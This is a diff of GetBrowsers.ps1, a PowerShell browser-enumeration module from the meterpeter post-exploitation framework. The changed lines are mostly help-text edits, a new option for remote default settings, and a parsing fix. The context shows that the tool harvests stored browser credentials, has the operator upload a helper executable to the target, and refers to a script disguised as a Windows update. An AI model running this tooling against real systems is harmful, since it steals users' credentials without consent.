@@ -75,15 +75,16 @@ If(-not($param1)){
     echo "[ ERROR ] This script requires parameters (-args) to run ..`n" >> $LogFilePath\BrowserEnum.log
     echo "Syntax: [scriptname] [-arg <mandatory>] [arg <optional>]`n" >> $LogFilePath\BrowserEnum.log
     echo "The following mandatory args are available:" >> $LogFilePath\BrowserEnum.log
-    echo "./GetBrowsers.ps1 -RECON            Fast Recon (Browsers and versions)" >> $LogFilePath\BrowserEnum.log
+    echo "./GetBrowsers.ps1 -RECON            Fast recon (browsers and versions)" >> $LogFilePath\BrowserEnum.log
+    echo "./GetBrowsers.ps1 -DEFAULTS         Enumerates remote sys default settings." >> $LogFilePath\BrowserEnum.log
     echo "./GetBrowsers.ps1 -IE               Enumerates IE browser information Only." >> $LogFilePath\BrowserEnum.log
     echo "./GetBrowsers.ps1 -ALL              Enumerates IE, Firefox, Chrome information." >> $LogFilePath\BrowserEnum.log
-    echo "./GetBrowsers.ps1 -CHROME           Enumerates Chrome Browser information Only." >> $LogFilePath\BrowserEnum.log
-    echo "./GetBrowsers.ps1 -FIREFOX          Enumerates Firefox Browser information Only." >> $LogFilePath\BrowserEnum.log
+    echo "./GetBrowsers.ps1 -CHROME           Enumerates Chrome browser information Only." >> $LogFilePath\BrowserEnum.log
+    echo "./GetBrowsers.ps1 -FIREFOX          Enumerates Firefox browser information Only." >> $LogFilePath\BrowserEnum.log
     echo "./GetBrowsers.ps1 -ADDONS           Enumerates ALL browsers extentions installed." >> $LogFilePath\BrowserEnum.log
     echo "./GetBrowsers.ps1 -CREDS            Enumerates ALL browsers credentials stored.`n" >> $LogFilePath\BrowserEnum.log
     echo "The following Optional args are available:" >> $LogFilePath\BrowserEnum.log
-    echo "./GetBrowsers.ps1 -IE `$env:TMP      Enumerates selected browser and saves logfile to TEMP.`n" >> $LogFilePath\BrowserEnum.log
+    echo "./GetBrowsers.ps1 -IE `$env:TMP     Enumerates selected browser and stores logfile to 'tmp'.`n" >> $LogFilePath\BrowserEnum.log
     Get-Content $LogFilePath\BrowserEnum.log;Remove-Item $LogFilePath\BrowserEnum.log -Force
         ## For those who insiste in running this script outside meterpeter
         If(-not(Test-Path "$env:tmp\Update-KB4524147.ps1")){
@@ -392,6 +393,7 @@ function FIREFOX {
             echo "Downloads    : {null}" >> $LogFilePath\BrowserEnum.log
         }else{
             $ParsingData = $JsPrefs -replace 'user_pref\(','' -replace '\"','' -replace ',',':' -replace '\);','' -replace 'browser.download.dir','Downloads    '
+            If($ParsingData -match '\\\\'){$ParsingData = $ParsingData -replace '\\\\','\'}
             echo "$ParsingData" >> $LogFilePath\BrowserEnum.log
         }
     }else{
@@ -496,6 +498,7 @@ function FIREFOX {
         If(-not(Test-Path "$env:tmp\mozlz4-win32.exe")){
             echo "{Upload: meterpeter\mimiRatz\mozlz4-win32.exe to target `$env:tmp}" >> $LogFilePath\BrowserEnum.log
             echo "{And Execute: [ ./GetBrowsers.ps1 -FIREFOX ] again for clean outputs}" >> $LogFilePath\BrowserEnum.log
+            echo "{https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/mozlz4-win32.exe}" >> $LogFilePath\BrowserEnum.log
             ## mozlz4-win32.exe Firefox Fail dependencie bypass
             # TODO: I cant use 'ConvertFrom-Json' cmdlet because it gives
             # 'primitive JSON invalid error' parsing .jsonlz4 files to TEXT|CSV ..  
